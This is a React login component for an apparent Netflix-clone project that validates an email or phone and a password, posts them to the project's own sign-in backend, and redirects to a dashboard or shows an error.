
import Header from "./Header";
import "../style.css";
import { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
function Login() {
  const navigate = useNavigate();
  const [username, setUserName] = useState("");
  const [password, setPassword] = useState("");
  const [usernamevalid, setUsernameValid]=useState(true);
  const[passwordvalid,setPasswordValid] = useState(true);

  //state to handle after response is returned from service:
  const [errorMsg, setErrorMsg] = useState("");
  const [loading, setLoading] = useState(false);
  const handleUsernameChange=(e)=>{
    setUserName(e.target.value)
    setUsernameValid(checkifusernamevalid(e.target.value));
    setErrorMsg("");
  }
  const checkifusernamevalid = (val)=>{
    if(val.trim()==="") return false;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10,15}$/;
    return emailRegex.test(val.trim()) || phoneRegex.test(val.trim());
  }
  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    setPasswordValid(checkifpasswordvalid(e.target.value));
  };
  const checkifpasswordvalid=(val)=>{
    return val.length>6;
  }
  const getApiUrl = () =>{
    return typeof window !== "undefined" &&
      window.location.hostname === "localhost"
      ? "http://localhost:5000"
      : "https://netflix-login-backend-svpc.onrender.com";
  }
  const handleContinue = async() =>{
    const usernameIsValid = checkifusernamevalid(username);
    const passwordIsValid = checkifpasswordvalid(password);
    setUsernameValid(usernameIsValid);
    setPasswordValid(passwordIsValid);
    try{
      setLoading(true);
      const res = await axios.post(`${getApiUrl()}/signin`, {
        creds: username.trim(),
        password: password,
      });
      if(res.data.status === true){
        navigate("/Dashboard");
      }else{
        setErrorMsg("Invalid email or password");
      }
      setUserName("");
      setPassword("");
    }catch(err){
      console.warn(err);
    }finally{
      setLoading(false);
    }
  }
  const canSubmit =
    usernamevalid && passwordvalid && username.trim() && password.trim();
  return (
    <div>
      <Header />
      <div className="signin-container">
        <h1 className="signin-title">Login</h1>
        <div className="input-wrapper">
          <input
            placeholder="Email or Phone"
            className={`signin-input ${!usernamevalid ? "invalid" : ""}`}
            value={username}
            onChange={handleUsernameChange}
            type="text"
          />

          <input
            type="password"
            placeholder="Password"
            className={`signin-input ${!passwordvalid ? "invalid" : ""}`}
            onChange={handlePasswordChange}
            value={password}
          />
          <button
            className={`continue-btn ${canSubmit ? "active" : ""}`}
            onClick={handleContinue}
            disabled={!canSubmit || loading}
          >
            {loading ? <div className="loader"></div> : "Continue"}
          </button>
        </div>
        {loading && <div className="loader"></div>}
        {errorMsg && <p className="error-message">{errorMsg}</p>}

        <div className="help-section">
          <h3>Get Help</h3>
          <p>This page is protected by Google reCAPTCHA.</p>
        </div>
      </div>
    </div>
  );
}

export default Login;